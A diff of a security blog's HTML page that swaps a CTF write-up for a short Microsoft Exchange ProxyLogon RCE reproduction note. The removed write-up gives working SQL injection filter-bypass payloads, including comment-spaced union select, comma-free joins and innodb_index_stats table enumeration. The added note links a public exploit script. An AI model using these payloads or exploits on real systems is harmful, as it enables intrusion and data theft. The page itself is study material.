@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>ctf记录-记一次有趣的注入 · c1ay&#39;s blog</title>
+    <title>Microsoft Exchange RCE · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >c1ay&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">ctf记录-记一次有趣的注入</a>
+                <a href="#" class="post-name">Microsoft Exchange RCE</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            ctf记录-记一次有趣的注入
+            Microsoft Exchange RCE
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">707</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">104</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/11/03</span>
+                    <span class="post-intro-time">2021/03/15</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,50 +401,22 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="ctf记录-记一次有趣的注入绕过"><a href="#ctf记录-记一次有趣的注入绕过" class="headerlink" title="ctf记录-记一次有趣的注入绕过"></a>ctf记录-记一次有趣的注入绕过</h1><p>正常页面：<br>xxx/article.php?id=2</p>
-<p>当<code>id=2&#39;</code>时返回404(页面不正常)，但是没有sql报错信息<br><img src="http://pic.c1imber.top/blog/20191103/3bsc8Vsv4JIk.png?imageslim" alt="mark"><br>当<code>id=2&quot;</code>时返回正常页面<br><img src="http://pic.c1imber.top/blog/20191103/pid239dEOaan.png?imageslim" alt="mark"><br>所以有可能是单引号包裹的字符型无报错回显注入</p>
-<p>当<code>id=2&#39;--</code>时– 被过滤，<code>id=2&#39;%23</code>页面正常显示,基本确定了存在注入<br><img src="http://pic.c1imber.top/blog/20191103/VQCYSJ7NGEI7.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/NBypRnQjWQ31.png?imageslim" alt="mark"></p>
-<p>该注入存在过滤，通过简单测试，发现大致过滤了order、information_schema、and、or、逗号等字符，并且对union select进行了过滤，但是union和select单独出现并没有过滤</p>
-<p>另外该注入无sql报错回显，只能使用union联合查询和盲注，由于前者在页面有回显，所以这里优先选择前者</p>
-<p>选择union注入的话，总结出需要突破的几个点：</p>
-<pre><code>1、需要突破对union select的过滤，另外order被过滤，所以不能通过order by判断列数
-2、注入不能使用逗号
-3、不能使用information_schema
-</code></pre><p>接下来，对这些限制进行突破，总之，过滤了什么，绕什么就行了~</p>
-<p>突破1：</p>
-<p>mysql当中<code>/**/</code>可以代替空格，可以使用<code>union/**/select</code>绕过对<code>union select</code>的过滤</p>
-<p>order被过滤，不能使用order by判断列数，使用以下方式判断列数</p>
-<pre><code>id=2&apos; union/**/select 1
-id=2&apos; union/**/select 1,2
-...    
-</code></pre><p>但是这里使用了逗号，被拦截<br><img src="http://pic.c1imber.top/blog/20191103/n0Ssb5lx5C6f.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/20191103/hlj42riH3JhY.png?imageslim" alt="mark"></p>
-<p>突破2：</p>
-<p>不能使用逗号，可以使用子查询绕过</p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select 4)d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/FAgbn0kGvekX.png?imageslim" alt="mark"><br>回显位在2和4，尝试检查查询一些信息，查询成功</p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select user())d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/quddeGfhqJ6i.png?imageslim" alt="mark"></p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select version())d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/vOUMiM47pRt8.png?imageslim" alt="mark"></p>
-<pre><code>id=112&apos; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select database())d%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/LLR8lDCOKcbU.png?imageslim" alt="mark"><br>但是在通过<code>information_schema</code>获取表名和列名时，被拦截</p>
-<p>突破3：</p>
-<p>关于注入不能使用<code>information_schema</code>,记得之前s1ye师傅有提到过绕过的方法，那时没有怎么研究，又去请教了一番s1ye师傅，得到解答~</p>
-<p>当不能使用<code>information_schema</code>时，可以使用<code>select group_concat(distinct table_name)from mysql.innodb_index_stats</code>获取到表名，很强（看来有必要仔细阅读一下mysql的官方手册了）</p>
-<p>获取表名：<br><code>id=112&#39; union/**/select * from (select 1)a join (select 2)b join (select 3)c join (select group_concat(distinct table_name)from mysql.innodb_index_stats)d%23</code><br><img src="http://pic.c1imber.top/blog/20191103/H4AwS6Lzcqdy.png?imageslim" alt="mark"></p>
-<p>接下来就是关于无列名注入的问题了，继续使用子查询就可以解决，获取flag~</p>
-<pre><code>id=112&apos; union/**/select * from ((select 1)a join (select 2)b join (select 3)c join (select group_concat(`3`) from (select * from ((select 1)a join (select 2)b join (select 3)c) union/**/select * from fl111aa44a99g)x)d)%23
-</code></pre><p><img src="http://pic.c1imber.top/blog/20191103/mvbTH4konJGF.png?imageslim" alt="mark"></p>
-<p>拖延症真的很可怕</p>
+        <p><strong>参考文章</strong></p>
+<p><a href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265" target="_blank" rel="external">https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265</a></p>
+<p><a href="https://github.com/sirpedrotavares/Proxylogon-exploit/blob/main/exploit.py" target="_blank" rel="external">https://github.com/sirpedrotavares/Proxylogon-exploit/blob/main/exploit.py</a></p>
+<p>CVE-2021-26855 SSRF+CVE-2021–27065 需要认证的任意文件写入</p>
+<p>需要根据上面的文章对github链接当中的工具进行修改</p>
+<p><strong>修改后效果</strong><br><img src="http://pic.c1imber.top/blog/20210315/5mJFrEWj1dTh.png?imageslim" alt="mark"></p>
+<p><img src="http://pic.c1imber.top/blog/20210315/L4zFBEAjmED9.png?imageslim" alt="mark"></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
-            <p>原文链接：<a href="https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/">https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/</a>
-            <p>发表日期：<a href="https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/">November 3rd 2019, 10:29:00 am</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2019/11/03/ctf记录-记一次有趣的注入/">November 7th 2019, 1:11:00 am</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2021/03/15/Microsoft Exchange RCE/">https://c1aysec.github.io/2021/03/15/Microsoft Exchange RCE/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2021/03/15/Microsoft Exchange RCE/">March 15th 2021, 10:59:05 am</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2021/03/15/Microsoft Exchange RCE/">March 15th 2021, 11:06:41 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -452,17 +424,12 @@ id=2&apos; union/**/select 1,2
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/01/10/phpweb前台任意文件上传/" title= "phpweb前台任意文件上传">
-                    <div class="nextTitle">phpweb前台任意文件上传</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/10/20/2019极客巅峰ctf记录/" title= "2019极客巅峰ctf记录">
-                    <div class="prevTitle">2019极客巅峰ctf记录</div>
+                <a href= "/2021/01/27/shellcode-uuid免杀/" title= "shellcode-uuid免杀">
+                    <div class="prevTitle">shellcode-uuid免杀</div>
                 </a>
             
         </li>
@@ -577,7 +544,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf记录-记一次有趣的注入绕过"><span class="toc-number">1.</span> <span class="toc-text">ctf记录-记一次有趣的注入绕过</span></a></li></ol>
+        
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
